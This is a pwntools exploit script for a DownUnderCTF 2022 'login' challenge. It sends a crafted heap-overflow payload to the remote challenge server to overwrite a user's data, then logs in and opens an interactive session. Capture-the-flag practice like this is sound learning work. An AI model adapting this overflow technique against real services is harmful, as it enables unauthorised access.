from pwn import *
import sys

elf = ELF("./login")

# io = process(elf.path)
io = remote("2022.ductf.dev", 30025)

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

# gdb.attach(io)

def add(len, name):
    io.sendlineafter("> ", b"1")
    io.sendlineafter("length:", len)
    io.sendlineafter("Username: ", name)

def login(name):
    io.sendlineafter("> ", b"2")
    io.sendlineafter("Username: ", name)

payload = b"A" * 20
payload += b"\x51\x0d\x02\x00"
payload += b"\x00" * 4
payload += p64(0x1337)

add(b"0", payload)

add(b"10", b"laika")
login(b"laika")

io.interactive()